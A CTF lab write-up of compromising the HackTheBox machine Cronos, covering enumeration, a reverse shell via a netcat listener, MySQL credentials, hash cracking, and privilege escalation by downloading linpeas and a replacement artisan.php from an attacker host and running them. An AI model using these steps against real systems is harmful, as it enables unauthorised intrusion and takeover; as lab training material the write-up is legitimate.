# Writeup 
## Recon

### rustscan

```
sudo rustscan -a 10.10.10.13 | tee rustscan.txt
```

### nmapAutomator

```
sudo nmapAutomator.sh -H 10.10.10.13 -t Recon 
```

### Running ffuf in the background

```
ffuf -ic -t 100 -w /home/kali/HTB/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cronos.htb/FUZZ -e .php,.txt,.cfg,.conf | tee ffuf-directory-medium.txt
```

### Initial web enumeration

![[35f772bb6ebb8e2fa3711d57ee2578aa-1.png]]

### DNS Enum

![[f31877f962247228c51bda5a0de32909-1.png]]

![[7731838ffe7155188d73ddfb4f7e7d01-1.png]]

### Editing /etc/hosts

![[9bfb5d0b26fc61666cf019e3706243b8-1.png]]

### Further web enumeration

![[55444be69b4bfb2fae05a003684bca36-1.png]]

![[6cf2885ff64cc6fc1757ea64a2dd00fe-1.png]]

### Additional ffuf scan on the admin subdomain

```
ffuf -ic -t 100 -w /home/kali/HTB/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://admin.cronos.htb/FUZZ -e .php,.txt,.cfg,.conf | tee admin-ffuf-directory-medium.txt
```

index, welcome, logout, config, session


## Initial Access

### Using Burp Repeater to access hidden content

![[0238bc98073cba1ef49da36d3a4c6b29-1.png]]

![[663ce7841b23a8b0a519a81abd9478dc-1.png]]

```
python3 -m http.server 80
```

![[67f70b8b7f966ed54f13321703dc4521-1.png]]

```
rlwrap nc -nvlp 1337
```

![[dfbf969cfec245b32124fcf3da2b96e3-1.png]]

![[dcf2e164761d34863936ecca016719a0-1.png]]

- But, attempting to run commands failed...

![[2fb3dc7fe36ada4fe0ff74f1a9f44c84-1.png]]

- So spawn a TTY shell using python

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

- User flag done!

![[09b0bb028a89482d8c1ef75814a7bbd7-1.png]]




## Privesc

![[c524180b6e81fe30e8ad7b7faaad46b1-1.png]]

![[9a5f6919f4293c320ace0ae8011e93ed-1.png]]

![[8beb8392b5eee2fcf41cb55f2e03e611-1.png]]

![[5510c7fe117be0992025a7afe78ba5e7-1.png]]

```
mysql -D admin --user=admin --password=kEjdbRigfBHUREiNSDs
mysql> show databases;
mysql> use admin;
mysql> show tables;
```

![[bef55bb8b4c08063e734a2b5216f73ed-1.png]]

- Use `hashes.com/en/decrypt/hash`

![[612a0269393ac7bffba086e7dde46552-1.png]]

- Result: `4f5fffa7b2340178a716e3832451e058:1327663704`

- Login to `admin.cronos.htb/index.php` using `admin:1327663704`

### Using linpeas

- On the target machine, in `/var/www/html`

```
wget 10.10.14.13/linpeas.sh
chmod +x 
./linpeas.sh | tee linpeas.out
```

![[af94ee88c587d61705157060f9b43d08-1.png]]

![[616fe3aa348d4debbd2a11f4d88c7d81-1.png]]

![[51dd711e8e334a5d4ebcb6513dd0d298-1.png]]

![[3d8937aad2cf5ed67c66fd452467136c-1.png]]

- On Kali, in the same directory as `artisan.php`
```
python3 -m http.server 80
```

- On the target machine, in `/var/www/laravel`
```
wget 10.10.14.13/artisan.php
chmod +x artisan.php
mv artisan artisan.bak
mv artisan.php artisan
```


![[3a6b7d0b125f363b8944b1bf49469dd9-1.png]]